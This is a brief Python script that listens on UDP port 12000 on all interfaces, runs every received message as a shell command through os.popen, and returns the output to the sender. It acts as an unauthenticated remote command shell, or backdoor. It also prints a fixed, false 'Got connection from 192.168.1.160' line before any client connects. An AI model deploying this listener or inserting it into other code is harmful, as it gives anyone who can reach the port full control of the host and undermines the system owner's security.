import os
import socket


def exec_cmd_2(cmd):
    myCmd = os.popen(cmd).read()
    # print(myCmd)
    return myCmd

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


if __name__=='__main__':
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print ("[+] Socket is listening")
    server_socket.bind(('', 12000)) 
    print('[+] Got connection from 192.168.1.160') 
    while True:

        message, address = server_socket.recvfrom(1024)

        print('Client wants to execute : ' + str(message, 'utf-8'))
        
        cmd = message.decode("utf-8")
        print("Returning output: ")
        
        myMsg = exec_cmd_2(cmd)
        print(myMsg)
        msg = bytes(myMsg,'utf-8')
        server_socket.sendto(msg, address)